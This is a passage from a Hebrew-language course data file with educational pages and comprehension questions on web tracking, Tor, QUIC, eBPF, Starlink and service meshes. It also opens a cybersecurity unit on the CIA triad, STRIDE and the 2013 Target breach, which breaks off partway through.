              <text x="177" y="59" text-anchor="middle" font-size="8" fill="var(--text-muted)">ynet.co.il</text>
              <rect x="280" y="20" width="70" height="55" rx="4" fill="#eff6ff" stroke="#3b82f6"/>
              <text x="315" y="42" text-anchor="middle" font-size="9" fill="#1d4ed8">Meta Pixel</text>
              <text x="315" y="57" text-anchor="middle" font-size="8" fill="#1d4ed8">יודעת: X קרא</text>
              <text x="315" y="69" text-anchor="middle" font-size="8" fill="#1d4ed8">חדשות ב-14:30</text>
              <path d="M 80 47 L 138 47" stroke="var(--accent)" stroke-width="2" marker-end="url(#a)"/>
              <path d="M 215 47 L 278 47" stroke="#3b82f6" stroke-width="2" stroke-dasharray="4,2"/>
              <text x="246" y="43" font-size="8" fill="#3b82f6">pixel req</text>
            </svg>
          </div>
          <p><strong>היקף המעקב:</strong></p>
          <ul>
            <li><code>Meta Pixel</code> נמצא ביותר מ-30% מאתרי האינטרנט</li>
            <li><code>Google Analytics</code> — ביותר מ-50% מהאתרים</li>
          </ul>
          <p>גם בלי חשבון רשום — הן בונות פרופיל "צללים" לפי <code>fingerprint</code> וכתובת <code>IP</code>.</p>
          <p><strong>כלי הגנה:</strong></p>
          <ul>
            <li><code>uBlock Origin</code> — חוסם <code>trackers</code></li>
            <li><code>Firefox Enhanced Tracking Protection</code> — הגנה מובנית בדפדפן</li>
            <li><code>Privacy Badger</code> — לומד ומזהה <code>trackers</code> חדשים</li>
          </ul>
          <p>ללא תוסף הגנה — כמעט בלתי אפשרי להימנע ממעקב.</p>
        `
      },
      {
        type: "explanation",
        title: "TOR – בצל של אנונימיות",
        content: `
          <p><strong><code>Tor</code></strong> (The Onion Router) — פותח על ידי מעבדת המחקר של הצי האמריקאי ב-1995.</p>
          <p>כיום יש לו כ-2 מיליון משתמשים יומיים. מנוהל על ידי <code>Tor Project</code>, ארגון ללא מטרות רווח.</p>
          <p><strong>איך עובד <code>Onion Routing</code>:</strong></p>
          <ol>
            <li>הדפדפן בוחר 3 nodes: Guard (Entry) → Middle → Exit</li>
            <li>מצפין את הנתונים בשלוש שכבות — כמו בצל</li>
            <li>Guard node מסיר שכבה ראשונה: יודע מאיפה הגעת, לא לאן</li>
            <li>Middle node מסיר שכבה שנייה: לא יודע מי שלח, לא לאן</li>
            <li>Exit node מסיר שכבה שלישית: יודע לאן, לא מי</li>
          </ol>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 380 90" class="content-diagram">
              <rect x="5" y="28" width="55" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="32" y="48" text-anchor="middle" font-size="9">את</text>
              <rect x="80" y="18" width="55" height="55" rx="4" fill="#fef3c7" stroke="#f59e0b"/>
              <text x="107" y="42" text-anchor="middle" font-size="8">Guard</text>
              <text x="107" y="54" text-anchor="middle" font-size="7" fill="#92400e">יודע: מי</text>
              <text x="107" y="64" text-anchor="middle" font-size="7" fill="#92400e">לא יודע: לאן</text>
              <rect x="160" y="18" width="55" height="55" rx="4" fill="#f0fdf4" stroke="#34d399"/>
              <text x="187" y="42" text-anchor="middle" font-size="8">Middle</text>
              <text x="187" y="54" text-anchor="middle" font-size="7" fill="#065f46">לא יודע</text>
              <text x="187" y="64" text-anchor="middle" font-size="7" fill="#065f46">כלום</text>
              <rect x="240" y="18" width="55" height="55" rx="4" fill="#fef2f2" stroke="#f87171"/>
              <text x="267" y="42" text-anchor="middle" font-size="8">Exit</text>
              <text x="267" y="54" text-anchor="middle" font-size="7" fill="#dc2626">יודע: לאן</text>
              <text x="267" y="64" text-anchor="middle" font-size="7" fill="#dc2626">לא יודע: מי</text>
              <rect x="320" y="28" width="55" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="347" y="48" text-anchor="middle" font-size="9">אתר</text>
              <path d="M 60 45 L 78 45" stroke="var(--accent)" stroke-width="2"/>
              <path d="M 135 45 L 158 45" stroke="var(--accent)" stroke-width="2"/>
              <path d="M 215 45 L 238 45" stroke="var(--accent)" stroke-width="2"/>
              <path d="M 295 45 L 318 45" stroke="var(--accent)" stroke-width="2"/>
              <text x="190" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">שום node אחד לא יודע הכל — זה Onion Routing</text>
            </svg>
          </div>
          <p><strong>מגבלות <code>Tor</code>:</strong></p>
          <ul>
            <li>איטי — 3 קפיצות בתוספת הצפנה יוצרות <code>latency</code> גבוה</li>
            <li><code>Exit node</code> יכול לקרוא תנועת <code>HTTP</code> רגילה, אך לא <code>HTTPS</code></li>
            <li>אנונימיות פגיעה אם תוקף רואה גם כניסה וגם יציאה — מתקפת <code>timing correlation</code></li>
            <li><code>JavaScript</code> עלול לחשוף כתובת <code>IP</code> — לכן <code>Tor Browser</code> מגביל אותו</li>
          </ul>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – האמת על פרטיות",
        intro: "<p>כמה עובדות שמפתיעות רוב האנשים:</p>",
        blocks: [
          {
            title: "Incognito Mode לא עושה מה שאת חושבת",
            icon: "🕵️",
            content: `
              <p>Incognito מוחק את ה-<em>local</em> history — את מה שנשמר בדפדפן שלך. זה הכל.</p>
              <p><strong>מי עדיין רואה:</strong></p>
              <ul>
                <li>ה-ISP שלך</li>
                <li>Google (אם מחוברים לחשבון)</li>
                <li>מנהל הרשת של ה-WiFi</li>
                <li>כל tracker שברשת</li>
              </ul>
              <p>Incognito = "לא ישמר על המחשב הזה". Google שילמה $5B בסכסוך קולקטיבי על הטעיה זו.</p>
            `
          },
          {
            title: "Metadata גרוע יותר מ-Content",
            icon: "📊",
            content: `
              <p><em>"We kill people based on metadata"</em> — Michael Hayden, ראש NSA לשעבר.</p>
              <p><strong>Metadata</strong> = מי דיבר עם מי, מתי, מאיזה מיקום. לא תוכן השיחה.</p>
              <p><strong>מ-metadata בלבד ניתן להסיק:</strong> יחסים, בריאות (שיחות לרופא), פוליטיקה, דת.</p>
              <p><code>HTTPS</code> מסתיר content — לא metadata.</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 25",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>ISP</code> רואה: כל <code>DNS query</code>, <code>TLS SNI</code> (שם הדומיין), <code>IP addresses</code>. לא את תוכן <code>HTTPS</code></li>
              <li><code>Browser Fingerprint</code>: <code>canvas</code>, <code>fonts</code>, <code>WebGL</code>, <code>screen</code> = זיהוי ייחודי כמעט ללא <code>cookies</code></li>
              <li><code>Third-party tracking</code>: <code>Meta Pixel</code> ב-30%+ אתרים. רואה אותך גם ללא לחיצה</li>
              <li><code>Tor</code> = <code>Onion Routing</code>: 3 <code>nodes</code>, שכבות הצפנה. שום node לא יודע הכל. איטי</li>
              <li><code>Incognito</code> = local only. <code>ISP</code>, <code>Google</code>, ISP Admin — עדיין רואים</li>
              <li><code>Metadata</code> גרוע מ<code>content</code>. "מי דיבר עם מי" = תמונה מלאה ללא תוכן</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 25",
        titleEn: "Chapter 25 — Comprehension Questions",
        questions: [
          {
            q: "גלשת ל-bank.com ב-HTTPS. מה ה-ISP יכול לראות?",
            a: "ה-ISP רואה: DNS query לbank.com (מי ה-IP), ה-TLS SNI בחיבור (שם 'bank.com'), כתובת IP של שרת הבנק, גודל ותזמון החבילות. לא יכול לראות: שם משתמש, סיסמה, תוכן הדפים — כל זה מוצפן ב-HTTPS.",
            qEn: "You browsed to bank.com using HTTPS. What can the ISP see?",
            aEn: "The ISP can see: DNS query for bank.com, the TLS SNI (the name 'bank.com'), the IP address of the bank server, and packet sizes and timing. It cannot see: username, password, or page content — all of that is encrypted by HTTPS."
          },
          {
            q: "מה Canvas Fingerprinting ולמה קשה להגן ממנו?",
            a: "האתר מצייר טקסט/צורות ב-canvas HTML. כל GPU/OS/גרסת דפדפן מצייר פיקסלים מעט שונים. ה-hash של התמונה ייחודי לציוד שלך. קשה להגן כי: אין לדעת מתי אתר עושה זאת (JavaScript מוסתר), ומניעה דורשת randomization שמשבש פונקציות לגיטימיות.",
            qEn: "What is Canvas Fingerprinting and why is it hard to defend against?",
            aEn: "The website draws text and shapes on an HTML canvas. Each GPU, OS, and browser version draws pixels slightly differently. The hash of the image is unique to your hardware. It is hard to defend against because you cannot tell when a site does this (hidden JavaScript), and blocking it requires randomization that breaks legitimate features."
          },
          {
            q: "כיצד Onion Routing מבטיח ש-ISP שלך לא יודע לאיזה אתר גלשת?",
            a: "מחשבך שולח לGuard node בלבד — encrypted לשלוש שכבות. ה-ISP רואה שיחה עם Guard node. Guard לא יודע מה בפנים. רק Exit node יכול לפתוח את היעד הסופי — אבל Exit לא יודע מי שלח. ISP רואה: 'התחברת ל-Tor'. לא מה ביקשת.",
            qEn: "How does Onion Routing make sure your ISP does not know which site you visited?",
            aEn: "Your computer sends only to the Guard node — encrypted in three layers. The ISP sees a conversation with the Guard node. The Guard does not know what is inside. Only the Exit node can see the final destination — but the Exit does not know who sent it. The ISP sees: 'you connected to Tor'. Not what you asked for."
          }
        ]
      }
    ]
  },
  {
    id: 26,
    title: "העתיד כבר כאן – QUIC, eBPF ו-Edge",
    pages: [
      {
        type: "explanation",
        title: "QUIC – הפרוטוקול שהחליף TCP",
        content: `
          <p><strong><code>QUIC</code></strong> פותח ב-<code>Google</code> ב-2012, הפך לסטנדרט IETF (RFC 9000) ב-2021.</p>
          <p>הוא הבסיס ל-<code>HTTP/3</code>. כיום: ~25% מתנועת האינטרנט רצה על <code>QUIC</code>.</p>
          <p><strong>מה <code>QUIC</code> פותר?</strong></p>
          <table class="content-table">
            <tr><th>בעיה ב-<code>TCP</code>/<code>TLS</code></th><th>פתרון <code>QUIC</code></th></tr>
            <tr><td><code>Handshake</code> = 3-way <code>TCP</code> + <code>TLS 1.3</code> = 2 round trips</td><td><code>0-RTT</code> / <code>1-RTT</code> — connection + crypto ב-round trip אחד</td></tr>
            <tr><td><code>HOL Blocking</code>: חבילה אחת אבודה עוצרת כולם</td><td><code>Streams</code> עצמאיים — חבילה אבודה משפיעה רק על stream אחד</td></tr>
            <tr><td><code>TCP</code> ב-<code>kernel</code> — קשה לעדכן ולשנות</td><td><code>QUIC</code> ב-<code>userspace</code> — <code>Google</code> עדכנה מהר ב-<code>Chrome</code> ובשרתים</td></tr>
            <tr><td><code>Connection</code> tied to <code>IP:Port</code> — מנותק בשינוי <code>WiFi</code></td><td><code>Connection ID</code> — נשאר connected גם אחרי שינוי <code>IP</code> (<code>roaming</code>)</td></tr>
          </table>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
              <rect x="10" y="10" width="155" height="80" rx="6" fill="#fef2f2" stroke="#f87171"/>
              <text x="87" y="28" text-anchor="middle" font-size="9" font-weight="bold" fill="#dc2626">TCP + TLS 1.3</text>
              <text x="87" y="43" text-anchor="middle" font-size="8" fill="#dc2626">RTT 1: SYN → SYN-ACK</text>
              <text x="87" y="55" text-anchor="middle" font-size="8" fill="#dc2626">RTT 2: TLS ClientHello</text>
              <text x="87" y="67" text-anchor="middle" font-size="8" fill="#dc2626">RTT 3: TLS Finished</text>
              <text x="87" y="82" text-anchor="middle" font-size="8" fill="#dc2626">→ 3 round trips</text>
              <rect x="195" y="10" width="155" height="80" rx="6" fill="#d1fae5" stroke="#34d399"/>
              <text x="272" y="28" text-anchor="middle" font-size="9" font-weight="bold" fill="#065f46">QUIC (HTTP/3)</text>
              <text x="272" y="43" text-anchor="middle" font-size="8" fill="#065f46">RTT 1: QUIC Initial (crypto+data)</text>
              <text x="272" y="55" text-anchor="middle" font-size="8" fill="#065f46">→ connection מוכן</text>
              <text x="272" y="67" text-anchor="middle" font-size="8" fill="#065f46">0-RTT reconnect</text>
              <text x="272" y="82" text-anchor="middle" font-size="8" fill="#065f46">→ 0-1 round trips</text>
            </svg>
          </div>
          <p><strong>0-RTT:</strong> אם כבר שוחחת עם שרת — <code>QUIC</code> שומר <code>session ticket</code>.</p>
          <p>בבקשה הבאה, שולח נתונים כבר ב-<code>packet</code> הראשון.</p>
          <p>פותח דף web לפני ש-<code>TCP</code> בכלל יצר חיבור.</p>
        `
      },
      {
        type: "explanation",
        title: "eBPF – תכנות ה-Kernel ללא תכנות Kernel",
        content: `
          <p><strong><code>eBPF</code></strong> (extended Berkeley Packet Filter) — אחד מהשינויים המהפכניים ביותר ב-Linux בעשור האחרון.</p>
          <p>מאפשר להריץ קוד בתוך Linux kernel — בלי לכתוב <code>kernel module</code>, בלי <code>reboot</code>, בבטיחות מוחלטת.</p>
          <p><strong>הרעיון:</strong></p>
          <ul>
            <li>BPF ישן (1992) — סינון <code>packets</code> ב-<code>tcpdump</code></li>
            <li>eBPF (2014+) — JIT-compiled bytecode שרץ ב-<code>kernel</code> ב-context של event: <code>network packet</code>, <code>syscall</code>, <code>function call</code>, <code>timer</code></li>
          </ul>
          <p><strong>למה זה מהפכני לרשתות:</strong></p>
          <ul>
            <li><strong><code>XDP</code> (eXpress Data Path):</strong> עיבוד packet <em>לפני</em> ה-kernel network stack — מיליוני pps</li>
            <li><strong><code>Cilium</code>:</strong> CNI ל-<code>Kubernetes</code> שמחליף <code>iptables</code> ב<code>eBPF</code>. תוצאה: 10x ביצועים, monitoring מובנה</li>
            <li><strong><code>Cloudflare</code>:</strong> <code>DDoS</code> mitigation שלהם רץ על <code>eBPF</code>/<code>XDP</code> — drop ב-line-rate ב-wire</li>
          </ul>
          <div class="code-preview">
            <pre><code>// eBPF XDP program — drop כל UDP מ-IP מסוים:
SEC("xdp")
int block_udp(struct xdp_md *ctx) {
    // גישה ישירה ל-packet ב-kernel
    struct ethhdr *eth = data;
    struct iphdr *ip = data + sizeof(*eth);
    if (ip->protocol == IPPROTO_UDP &&
        ip->saddr == htonl(0xC0A80101)) {
        return XDP_DROP; // drop לפני kernel stack
    }
    return XDP_PASS;
}</code></pre>
          </div>
          <p><strong>Meta, Google, Netflix, Cloudflare</strong> — כולן השקיעו ב-<code>eBPF</code>.</p>
          <p>זה הבסיס ל-infrastructure observability מודרנית — trace כל <code>syscall</code>, כל <code>network call</code>, בלי שינוי קוד.</p>
        `
      },
      {
        type: "explanation",
        title: "Starlink – אינטרנט מהחלל",
        content: `
          <p><code>SpaceX Starlink</code>: ~6,000 לווינים ב-<code>Low Earth Orbit</code> (<code>LEO</code>, 550km), עם תוכנית ל-42,000.</p>
          <p>ה-constellation הגדולה ביותר בהיסטוריה.</p>
          <p><strong>למה LEO ולא GEO?</strong></p>
          <table class="content-table">
            <tr><th></th><th><code>GEO</code> (35,786km)</th><th><code>LEO</code> (550km)</th></tr>
            <tr><td><code>Latency</code></td><td>600ms+ <code>RTT</code></td><td>20-40ms <code>RTT</code></td></tr>
            <tr><td>לווינים נדרשים</td><td>3 מכסים את כל כדור הארץ</td><td>אלפים (תמיד נעים מעל)</td></tr>
            <tr><td><code>bandwidth</code> per user</td><td>נמוך יחסית</td><td>50-200 Mbps</td></tr>
            <tr><td>גישה לאזורים נידחים</td><td>✓</td><td>✓</td></tr>
          </table>
          <p><strong>איך Starlink מנתב:</strong></p>
          <ul>
            <li>ה-user terminal (dish) מתחבר ל-satellite שמעל</li>
            <li>Laser <code>inter-satellite links</code> (<code>ISL</code>) מנתבים בין לווינים — כמו <code>BGP</code> בחלל</li>
            <li>ה-traffic יורד ל-<code>ground station</code> ומשם עולה לאינטרנט</li>
          </ul>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
              <ellipse cx="180" cy="90" rx="170" ry="15" fill="var(--accent-soft)" stroke="var(--accent)" opacity="0.5"/>
              <text x="180" y="93" text-anchor="middle" font-size="8">כדור הארץ</text>
              <circle cx="60" cy="30" r="8" fill="#0891b2" stroke="#0e7490"/>
              <text x="60" y="18" text-anchor="middle" font-size="7" fill="#0e7490">LEO</text>
              <circle cx="180" cy="15" r="8" fill="#0891b2" stroke="#0e7490"/>
              <text x="180" y="8" text-anchor="middle" font-size="7" fill="#0e7490">LEO</text>
              <circle cx="300" cy="30" r="8" fill="#0891b2" stroke="#0e7490"/>
              <text x="300" y="18" text-anchor="middle" font-size="7" fill="#0e7490">LEO</text>
              <line x1="68" y1="34" x2="172" y2="19" stroke="#0891b2" stroke-width="1.5" stroke-dasharray="3,2"/>
              <line x1="188" y1="19" x2="292" y2="34" stroke="#0891b2" stroke-width="1.5" stroke-dasharray="3,2"/>
              <line x1="60" y1="38" x2="80" y2="76" stroke="var(--accent)" stroke-width="1.5"/>
              <rect x="70" y="75" width="25" height="10" rx="2" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="82" y="83" text-anchor="middle" font-size="7">dish</text>
              <text x="180" y="60" text-anchor="middle" font-size="8" fill="var(--text-muted)">ISL: laser link בין לווינים</text>
            </svg>
          </div>
          <p><strong>שימושים שמשנים חיים:</strong></p>
          <ul>
            <li>כפרים ללא fiber</li>
            <li>ספינות ומטוסים</li>
            <li>אזורי אסון</li>
            <li>אוקראינה במלחמה — Starlink הפך ל-infrastructure קריטית</li>
          </ul>
          <p><strong>חסרונות:</strong></p>
          <ul>
            <li>גשם ועננות מפריעים לאות</li>
            <li>עלות גבוהה</li>
            <li>חששות מ-space debris ו-light pollution</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "Service Mesh ו-Zero Trust ב-Enterprises",
        content: `
          <p>בעולם ה-<code>microservices</code> — לא מספיק לאבטח את ה-<code>perimeter</code>.</p>
          <p>כל <code>service</code> צריך לאמת כל <code>request</code>. זה <strong><code>Service Mesh</code></strong>.</p>
          <p><strong><code>sidecar proxy</code> pattern:</strong></p>
          <ul>
            <li>כל <code>pod</code> ב-<code>Kubernetes</code> מקבל <code>sidecar</code> container (לרוב <code>Envoy proxy</code>)</li>
            <li>כל תנועה (in/out) עוברת דרך ה-<code>sidecar</code></li>
            <li><code>mTLS</code> אוטומטי: כל שיחה בין services מוצפנת + authenticated</li>
            <li><code>observability</code> חינמית: metrics, traces, logs — בלי שינוי קוד</li>
          </ul>
          <div class="code-preview">
            <pre><code># Istio Service Mesh — traffic policy:
apiVersion: networking.istio.io/v1alpha3
kind: DestinationRule
metadata:
  name: payment-service
spec:
  host: payment-svc
  trafficPolicy:
    tls:
      mode: ISTIO_MUTUAL  # mTLS אוטומטי
  connectionPool:
    tcp:
      maxConnections: 100
  outlierDetection:
    consecutiveErrors: 3
    interval: 30s
    baseEjectionTime: 30s  # circuit breaker</code></pre>
          </div>
          <p><strong><code>Circuit Breaker</code> pattern:</strong> אם <code>service</code> מחזיר שגיאות — ה-<code>mesh</code> מפסיק לשלוח אליו ומחכה ל-<code>recovery</code>.</p>
          <p>מונע <code>cascading failures</code>.</p>
          <p><strong>Zero Trust + Service Mesh:</strong></p>
          <ul>
            <li>כל <code>service</code> מחזיקה <code>certificate</code></li>
            <li>כל <code>request</code> נאמת</li>
            <li><code>policy</code> מנוהל centrally</li>
          </ul>
          <p>אפילו <code>attacker</code> בתוך cluster לא יכול לנוע <code>laterally</code> בקלות.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – לאן הרשת הולכת",
        intro: "<p>כמה תחומים שיעצבו את הרשת בעשור הבא:</p>",
        blocks: [
          {
            title: "eBPF = מחליף iptables, routing, ועוד",
            icon: "🔧",
            content: `<p><code>iptables</code> — הכלי שניהל firewalls ב־Linux מ-1998 — מיועד לפנסיה.</p><p><code>Cilium</code> + <code>eBPF</code> מחליפים אותו ב-Kubernetes.</p><ul><li>Meta מריצה <strong>Katran</strong> — load balancer מבוסס eBPF שמטפל במאות מיליוני חיבורים</li><li><code>eBPF</code> מאפשר trace של כל syscall ב-production בלי overhead</li></ul><p>זה ה־TCP/IP של הדור הבא.</p>`
          },
          {
            title: "האינטרנט של הדברים",
            icon: "📡",
            content: `<p><code>IPv6</code> נוצר עם 2<sup>128</sup> כתובות — מספיק לכל אטום על פני כדור הארץ, פי מיליון.</p><p><strong>IoT במספרים:</strong></p><ul><li>כ־15 מיליארד מכשירים מחוברים ב-2024</li><li>צפי ל-30 מיליארד ב-2030</li><li>כל מקרר, מנורה וחיישן — IP משלו</li></ul><p><strong>פרוטוקולי mesh למכשירים קטנים:</strong> Thread (Matter), Zigbee, LoRaWAN.</p><p>הרשת עוברת מחיבור <em>מחשבים</em> לחיבור <em>עולם פיזי</em>.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 26",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>QUIC</code>: <code>UDP</code>-based, <code>0-RTT</code>, <code>streams</code> עצמאיים (אין <code>HOL blocking</code>), <code>connection migration</code>. בסיס <code>HTTP/3</code></li>
              <li><code>eBPF</code>: קוד ב-<code>kernel</code> בלי <code>kernel module</code>. <code>XDP</code> = עיבוד packet לפני <code>network stack</code>. <code>Cilium</code>, <code>Cloudflare</code> <code>DDoS</code></li>
              <li><code>Starlink LEO</code>: 550km, 20-40ms latency (vs. 600ms <code>GEO</code>). אלפי לווינים, <code>ISL</code> lasers בחלל</li>
              <li><code>Service Mesh</code>: <code>sidecar proxy</code>, <code>mTLS</code> אוטומטי, <code>circuit breaker</code>, <code>Zero Trust</code> per-service</li>
              <li><code>eBPF</code> מחליף <code>iptables</code>. <code>IoT</code> = 30B מכשירים ב-2030. הרשת מחברת עולם פיזי</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 26",
        titleEn: "Chapter 26 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין HTTP/2 ל-HTTP/3 מבחינת שכבת התעבורה?",
            a: "HTTP/2 רץ על TCP. חבילה אחת שאבדה — כל ה-streams מחכים (HOL blocking ברמת TCP). HTTP/3 רץ על QUIC/UDP. כל stream עצמאי גם ברמת transport. חבילה שאבדה משפיעה רק על stream אחד.",
            qEn: "What is the difference between HTTP/2 and HTTP/3 at the transport layer?",
            aEn: "HTTP/2 runs on TCP. One lost packet makes all streams wait (HOL blocking at TCP level). HTTP/3 runs on QUIC/UDP. Each stream is independent at the transport level too. A lost packet affects only one stream."
          },
          {
            q: "למה eBPF מהפכני לאבטחת רשתות?",
            a: "eBPF מריץ קוד בתוך kernel ב-XDP context — לפני שהpacket מגיע לnetwork stack. זה מאפשר drop/filter ב-line rate של hardware (מיליוני pps). קוד דינמי שניתן לעדכן בלי reboot. Cloudflare משתמשת בזה ל-DDoS mitigation. בנוסף — full observability של כל syscall ב-production ללא overhead.",
            qEn: "Why is eBPF revolutionary for network security?",
            aEn: "eBPF runs code inside the kernel at the XDP level — before the packet reaches the network stack. This allows drop/filter at hardware line rate (millions of packets per second). The code is dynamic and can be updated without reboot. Cloudflare uses it for DDoS mitigation. It also gives full observability of every syscall in production with no overhead."
          },
          {
            q: "מה בעיית HOL Blocking ב-TCP ואיך QUIC פותר אותה?",
            a: "HOL Blocking = Head-of-Line Blocking. TCP הוא stream אחד, ordered. אם חבילה 5 אבדה — חבילות 6, 7, 8 שכבר הגיעו מחכות בbuffer. כל multiplexing שמעל TCP (HTTP/2) סובל מזה. QUIC: כל stream הוא flow עצמאי ב-UDP. אובדן חבילה בstream A לא עוצר stream B.",
            qEn: "What is the HOL Blocking problem in TCP and how does QUIC solve it?",
            aEn: "HOL Blocking means Head-of-Line Blocking. TCP is one ordered stream. If packet 5 is lost, packets 6, 7, 8 that already arrived wait in the buffer. Any multiplexing on top of TCP (HTTP/2) suffers from this. QUIC: each stream is an independent flow over UDP. A lost packet in stream A does not stop stream B."
          }
        ]
      }
    ]
  }
    ]
  },
  {
    id: 'cyber',
    title: 'אבטחת מידע',
    subtitle: 'Pentesting, CTF, SOC, Bug Bounty — מהבסיס למקצוען',
    icon: '🔐',
    color: '#ef4444',
    level: 'בינוני–מתקדם',
    chapters: [
  {
    id: 101,
    title: "CIA Triad — יסודות אבטחת מידע",
    pages: [
      {
        type: "explanation",
        title: "שלושת עמודי תווך",
        content: `<div dir="rtl">
<p><strong>CIA Triad — המודל שמנחה כל מחשבה בסייבר</strong></p>
<p>לפני שמדברים על כלים ותקיפות, חייבים להבין מה אנחנו מגינים.</p>
<p>כל בעיית אבטחה ניתנת לסיווג לאחת משלוש קטגוריות.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 150" class="content-diagram">
  <polygon points="180,15 30,135 330,135" fill="none" stroke="#64748b" stroke-width="2"/>
  <circle cx="180" cy="28" r="22" fill="#7f1d1d" stroke="#ef4444" stroke-width="2"/>
  <text x="180" y="24" text-anchor="middle" font-size="9" fill="#fca5a5" font-weight="bold">Confidentiality</text>
  <text x="180" y="36" text-anchor="middle" font-size="8" fill="#fca5a5">סודיות</text>
  <circle cx="65" cy="128" r="22" fill="#14532d" stroke="#22c55e" stroke-width="2"/>
  <text x="65" y="124" text-anchor="middle" font-size="9" fill="#86efac" font-weight="bold">Integrity</text>
  <text x="65" y="136" text-anchor="middle" font-size="8" fill="#86efac">שלמות</text>
  <circle cx="295" cy="128" r="22" fill="#1e3a5f" stroke="#3b82f6" stroke-width="2"/>
  <text x="295" y="124" text-anchor="middle" font-size="9" fill="#93c5fd" font-weight="bold">Availability</text>
  <text x="295" y="136" text-anchor="middle" font-size="8" fill="#93c5fd">זמינות</text>
  <text x="180" y="90" text-anchor="middle" font-size="10" fill="#94a3b8">CIA</text>
</svg>
</div>
<table class="content-table">
  <tr><th>עיקרון</th><th>הגדרה</th><th>איום נגדו</th><th>הגנה</th></tr>
  <tr><td><strong><code>Confidentiality</code></strong></td><td>רק מורשים יכולים לגשת למידע</td><td><code>Sniffing</code>, <code>Data Breach</code></td><td>הצפנה, <code>ACL</code>, <code>MFA</code></td></tr>
  <tr><td><strong><code>Integrity</code></strong></td><td>המידע לא שונה ללא הרשאה</td><td><code>Tampering</code>, <code>Injection</code></td><td><code>Hash</code>, <code>Digital Signature</code>, <code>Audit Log</code></td></tr>
  <tr><td><strong><code>Availability</code></strong></td><td>המערכת זמינה כשצריך</td><td><code>DoS</code>/<code>DDoS</code>, <code>Ransomware</code></td><td><code>Redundancy</code>, <code>Rate Limiting</code>, <code>Backup</code></td></tr>
</table>
<p>כשאתה שומע על <code>breach</code>, שאל: <em>איזה עיקרון הופר?</em></p>
<ul>
<li><strong>Equifax 2017</strong> — פגיעה ב-<code>Confidentiality</code>: נחשפו 147 מיליון רשומות אישיות</li>
<li><strong>NotPetya</strong> — פגיעה ב-<code>Availability</code>: חברות שלמות הפסיקו לתפקד</li>
<li><strong>SolarWinds</strong> — פגיעה ב-<code>Integrity</code>: עדכון תוכנה רשמי שונה בידי תוקפים</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "STRIDE ו-Threat Modeling",
        content: `<div dir="rtl">
<p><strong>STRIDE — מיפוי איומים בשיטה</strong></p>
<p><code>Threat Modeling</code> שואל: מה יכול להשתבש?</p>
<p>Microsoft פיתחה את <code>STRIDE</code> בשנות ה-90. הוא הכלי הטוב ביותר לניתוח סיסטמטי של איומים:</p>
<table class="content-table">
  <tr><th>אות</th><th>איום</th><th>דוגמה</th><th>הגנה</th></tr>
  <tr><td><strong>S</strong></td><td><code>Spoofing</code> — התחזות</td><td><code>Email spoofing</code>, <code>ARP poisoning</code></td><td>אימות, <code>SPF</code>/<code>DKIM</code>, <code>certificates</code></td></tr>
  <tr><td><strong>T</strong></td><td><code>Tampering</code> — שינוי נתונים</td><td><code>SQL injection</code>, <code>MITM</code></td><td><code>Hashing</code>, <code>digital signatures</code>, <code>TLS</code></td></tr>
  <tr><td><strong>R</strong></td><td><code>Repudiation</code> — הכחשה</td><td>"לא אני שלחתי את הפקודה"</td><td><code>Audit logs</code>, <code>digital signatures</code></td></tr>
  <tr><td><strong>I</strong></td><td><code>Info Disclosure</code> — דליפת מידע</td><td>חשיפת <code>error messages</code> עם <code>DB</code> info</td><td>הצפנה, <code>input validation</code></td></tr>
  <tr><td><strong>D</strong></td><td><code>Denial of Service</code></td><td><code>SYN flood</code>, <code>Slowloris</code></td><td><code>Rate limiting</code>, <code>CDN</code>, <code>WAF</code></td></tr>
  <tr><td><strong>E</strong></td><td><code>Elevation of Privilege</code></td><td><code>Buffer overflow</code> → <code>root access</code></td><td><code>Least privilege</code>, <code>sandboxing</code></td></tr>
</table>
<p><strong><code>Attack Surface Analysis</code></strong></p>
<p><code>Attack Surface</code> הוא כל נקודות הכניסה האפשריות למערכת.</p>
<p>כלל אצבע: צמצם את ה-<code>Attack Surface</code> ככל האפשר.</p>
<ul>
<li>כל <code>endpoint API</code> שחשוף = <code>attack surface</code></li>
<li>כל <code>dependency</code> (<code>npm</code>, <code>pip</code>) = <code>attack surface</code></li>
<li>כל <code>employee</code> עם <code>access</code> = <code>attack surface</code></li>
<li>כל <code>port</code> פתוח = <code>attack surface</code></li>
</ul>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Target 2013 — 40M כרטיסי אשראי",
        content: `<div dir="rtl">
<p><strong>כשה-HVAC contractor הרס את Target</strong></p>
<p>נובמבר 2013, ארה"ב: Target הותקפה.</p>
<ul>
<li>40 מיליון כרטיסי אשראי נגנבו בשישה שבועות</li>
<li>עלות: $162M ישירים, $1B+ בנזקים עקיפים</li>
<li>CEO ו-CISO התפטרו</li>
</ul>
<p><strong>שלבי המתקפה (kill chain):</strong></p>
<ol>
<li><strong><code>Reconnaissance</code>:</strong> התוקפים זיהו ש-Target עובדת עם vendor HVAC (Fazio Mechanical) שיש לו <code>remote access</code> לרשת לניטור מערכות חימום.</li>
<li><strong><code>Initial Access</code>:</strong> Phishing email ל-Fazio → גנבו credentials → נכנסו לפורטל הvendor של Target.</li>
